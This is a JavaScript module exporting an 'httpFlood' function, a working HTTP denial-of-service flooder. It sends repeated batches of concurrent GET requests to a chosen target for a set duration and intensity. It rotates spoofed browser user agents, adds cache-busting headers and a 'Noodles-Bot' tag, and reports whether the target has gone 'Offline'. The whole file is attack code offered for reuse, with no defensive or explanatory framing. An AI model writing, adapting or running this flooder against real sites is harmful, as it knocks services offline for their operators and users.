async function httpFlood(target, duration, intensity) {
  let packetsSent = 0;
  let targetStatus = 'Online';
  let mbps = 0;
  const startTime = Date.now();

  try {
    const url = new URL(target);
    const host = url.hostname;
    const path = url.pathname || '/';
    let port = url.port;

    if (!port) {
      port = url.protocol === 'https:' ? 443 : 80;
    } else {
      port = parseInt(port, 10);
    }

    const protocol = url.protocol === 'https:' ? 'https' : 'http';
    const interval = Math.max(1, 50 / intensity);

    const userAgents = [
      'Noodles-Bot v3.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    ];

    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
      controller.abort();
      targetStatus = 'Timeout';
      console.warn("Request timed out");
    }, 15000); // Set a timeout of 15 seconds

    while (Date.now() - startTime < duration * 1000) {
      const promises = [];
      for (let i = 0; i < intensity; i++) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        const promise = fetch(target, {
            method: 'GET',
            headers: {
              'User-Agent': userAgent,
              'X-Noodles-Bot': 'Active',
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive'
            },
            mode: 'no-cors',
            signal: controller.signal,
          })
          .then(response => {
            packetsSent++;
            if (response.ok) {
              const contentLength = response.headers.get('content-length');
              if (contentLength) {
                mbps += parseFloat(contentLength) / 1000000;
              }
            } else {
              targetStatus = 'Unresponsive';
              console.warn(`Request failed with status: ${response.status}`);
            }
          })
          .catch(error => {
            if (error.name === 'AbortError') {
              // Timeout, handled above
            } else {
              targetStatus = 'Offline';
              console.warn("Request failed:", error); // Log the error for debugging.
            }
          });
        promises.push(promise);
      }
      await Promise.all(promises);
      await new Promise(resolve => setTimeout(resolve, interval));
    }

    clearTimeout(timeoutId);

  } catch (error) {
    console.error("Error in httpFlood:", error);
    targetStatus = 'Offline';
  }

  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
  return { packetsSent, targetStatus, mbps };
}

module.exports = { httpFlood };